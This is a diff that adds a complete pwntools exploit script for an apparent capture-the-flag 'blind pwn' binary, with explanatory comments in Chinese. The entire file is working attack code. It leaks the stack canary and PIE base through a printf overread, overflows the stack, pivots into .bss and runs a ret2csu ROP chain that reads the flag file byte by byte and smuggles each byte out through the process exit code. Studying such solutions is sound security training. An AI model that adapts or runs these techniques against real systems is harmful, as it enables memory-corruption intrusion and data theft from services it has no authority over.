@@ -1,0 +1,197 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+blind pwn  利用脚本(exit-code 外带 flag)
+
+目标: pwn (PIE + canary + NX), libc 2.27
+流程:
+  open("flag") -> fd 3
+  read size (<= 0x88)
+  get_input(buf) ; printf("Your name is: %s", buf)      <-- 唯一一次输出
+  get_input(buf) ; sleep(1) ; blind()                    <-- close(1),close(2)
+                                                          seccomp: 只放行 read/exit/exit_group
+  printf("there is no output right?")
+
+  所以 flag 只能通过 exit code 外带(每次连接 1 字节)
+
+信息泄露(一次性同时拿到 canary 和 PIE 基址):
+  给 0x58 个 'A' + 1 个非 0 字节:
+    * 最后一个字节打掉 canary 最低字节(本来就是 0x00), %s 于是继续打印 canary 高 7 字节
+    * canary 之后是 main 保存的 rbp -- 源码里 `mov [rbp], rcx`, 进 main 时 rcx = &__libc_csu_init
+      => 泄露值 = PIE_base + 0x2005a0
+  字符串在指针高位 0x00 处结束, 一次 printf 就够
+
+利用:
+  第一段 (ret 后面只有 4 个 qword):
+      pop rdi; ret | stage2 | get_input | leave; ret
+      saved rbp 也设成 stage2 -> get_input(stage2, esi=0xc330) 把我们发的一行写进 .bss
+                               -> leave;ret 把 rsp 平移到 .bss, 跑第二段
+  第二段 (在 .bss 里, 空间足够):
+      __libc_csu_init 的 pop 链 + call 链:
+        read(3, scratch, i)  # 丢掉前 i 字节
+        read(3, dst,   1)    # 第 i 个字节正好落进即将被 pop 的槽位
+        pop rdi; ret         # rdi = flag[i]
+        exit@plt             # 退出码 = flag[i]
+"""
+import os, sys, time
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = os.environ.get('LOG', 'info')
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+BIN  = './pwn'
+LD   = './ld-linux-x86-64.so.2'
+
+# ---- 二进制内偏移 ----
+CSU_INIT  = 0x2005a0   # __libc_csu_init      (泄露值 - 该偏移 = PIE 基址)
+POP_RDI   = 0x200603   # pop rdi; ret
+CSU_POP   = 0x2005fa   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+CSU_CALL  = 0x2005e0   # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
+GET_INPUT = 0x20031c   # get_input(char *dest, unsigned size)  -> read(0,&c,1) 循环
+LEAVE_RET = 0x20059d   # leave; ret
+EXIT_PLT  = 0x2000f0   # exit@plt
+GOT_READ  = 0x600fa8   # read@got
+
+# ---- .bss 第二段布局(可写页 0x601000-0x602000) ----
+STAGE2_OFF  = 0x601200
+SCRATCH_OFF = STAGE2_OFF + 0x500
+PIVOT_PAD   = 8        # leave;ret 的 pop rbp
+BLOCK       = 0x78     # 一个 csu_read 块占 15 个 qword
+DST_OFF     = STAGE2_OFF + PIVOT_PAD + 3 * BLOCK + 8   # POP_RDI 后面那个槽位
+
+SIZE_LEAK = 0x59        # 只打掉 canary 最低字节
+SIZE_MAX  = 0x88        # 程序允许的最大输入
+
+
+def start():
+    if args.REMOTE:
+        host, port = args.REMOTE.split(':')
+        return remote(host, int(port))
+    return process([LD, '--library-path', '.', BIN], cwd=HERE)
+
+
+def csu_read(pie, fd, dst, n):
+    """ret2csu: read(fd, dst, n)"""
+    s  = p64(pie + CSU_POP)
+    s += p64(0)               # rbx = 0        -> [r12+0]
+    s += p64(1)               # rbp = rbx+1    -> call 返回后不再回跳
+    s += p64(pie + GOT_READ)  # r12 -> read
+    s += p64(fd)              # r13 -> edi
+    s += p64(dst)             # r14 -> rsi
+    s += p64(n)               # r15 -> rdx
+    s += p64(pie + CSU_CALL)
+    s += p64(0)               # call 后 add rsp,8 跳过
+    s += p64(0) * 6           # pop rbx,rbp,r12,r13,r14,r15
+    assert len(s) == BLOCK
+    return s
+
+
+def build_stage2(pie, idx):
+    dst     = pie + DST_OFF
+    scratch = pie + SCRATCH_OFF
+    # 一次 read 要跳过 idx 字节; idx == 0x0a 时 0x0a 会出现在 payload 里
+    # (get_input 遇 \n 截断), 拆成 5+5
+    chunks = (5, 5) if idx == 0x0a else (idx, 0)
+
+    s  = p64(0)                                  # pivot 的 pop rbp
+    s += csu_read(pie, 3, scratch, chunks[0])    # 丢掉前 chunks[0] 字节
+    s += csu_read(pie, 3, scratch, chunks[1])    # 丢掉前 chunks[1] 字节
+    s += csu_read(pie, 3, dst, 1)                # 读第 idx 个字节 -> dst 槽位
+    s += p64(pie + POP_RDI)                      # rdi = 槽位内容 = flag[idx]
+    s += p64(0)                                  # 槽位(先清 0, read 只改最低字节)
+    s += p64(pie + EXIT_PLT)                     # exit(flag[idx])
+    assert len(s) == PIVOT_PAD + 3 * BLOCK + 0x18
+    return s
+
+
+def get_byte(idx, timeout=8):
+    """读 flag[idx] ; 成功返回 0..255, 失败返回 None(重连)"""
+    p = start()
+    try:
+        p.recvuntil(b'name size')
+        p.send(b'136\n')                      # 0x88: 两次 get_input 共用这个长度上限
+        p.recvuntil(b'> ')
+
+        # ---- 泄露 canary + PIE ----
+        p.send(b'A' * (SIZE_LEAK - 1) + b'X' + b'\n')
+        data = p.recvuntil(b'Now you have 1 choice to change your name.')
+        body = data.split(b'Your name is: ', 1)[1].rsplit(b'\nNow you have 1 choice', 1)[0]
+        if len(body) < SIZE_LEAK + 13:
+            return None
+        canary = b'\x00' + body[SIZE_LEAK:SIZE_LEAK + 7]
+        pie = u64(body[SIZE_LEAK + 7:SIZE_LEAK + 13].ljust(8, b'\x00')) - CSU_INIT
+        if pie & 0xfff or pie >> 48:
+            return None
+
+        stage2 = pie + STAGE2_OFF
+        s2 = build_stage2(pie, idx)
+
+        # ---- 第一段: canary + saved_rbp(=stage2) + 4 个 qword ----
+        payload  = b'B' * 0x58
+        payload += canary
+        payload += p64(stage2)
+        payload += p64(pie + POP_RDI)
+        payload += p64(stage2)
+        payload += p64(pie + GET_INPUT)
+        payload += p64(pie + LEAVE_RET)
+        assert len(payload) == SIZE_MAX
+
+        if b'\n' in payload or b'\n' in s2:    # get_input 遇 \n 会截断 -> 换个进程重来
+            return None
+
+        p.send(payload)
+        time.sleep(1.05)                       # 等 sleep(1) + blind()
+        p.send(s2 + b'\n')
+
+        if args.REMOTE and os.environ.get('EXIT_REPORT'):
+            # 服务端会把子进程退出码写成 "EXIT=<n>" 发回来
+            try:
+                p.recvuntil(b'EXIT=', timeout=timeout)
+                rc = int(p.recvline(timeout=3).strip() or b'0')
+            except Exception:
+                return None
+        else:
+            p.wait(timeout=timeout)
+            rc = p.returncode
+        if rc is None or rc == 0:              # 0 = 走了正常 return, 链没生效
+            return None
+        return rc & 0xff
+    except Exception:
+        return None
+    finally:
+        p.close()
+
+
+def main():
+    if os.environ.get('IDX'):            # IDX=7 -> 只取第 7 个字节, 打印退出码
+        i = int(os.environ['IDX'])
+        for _ in range(8):
+            b = get_byte(i)
+            if b is not None:
+                print('flag[%d] = 0x%02x  %r' % (i, b, chr(b) if 32 <= b < 127 else '.'))
+                return
+        print('flag[%d] = FAILED' % i)
+        return
+    n = int(os.environ.get('MAXLEN', '80'))
+    got = b''
+    for i in range(n):
+        b = None
+        for _ in range(10):
+            b = get_byte(i)
+            if b is not None:
+                break
+        if b is None:
+            log.warning('index %d: give up', i)
+            break
+        got += bytes([b])
+        log.success('flag[%02d] = 0x%02x  -> %r' % (i, b, got))
+        if b == 0x0a or b == 0x00:
+            break
+        if got.endswith(b'}'):
+            break
+    print('\nFLAG = %s' % got.rstrip(b'\n').decode('latin1'))
+
+
+if __name__ == '__main__':
+    main()
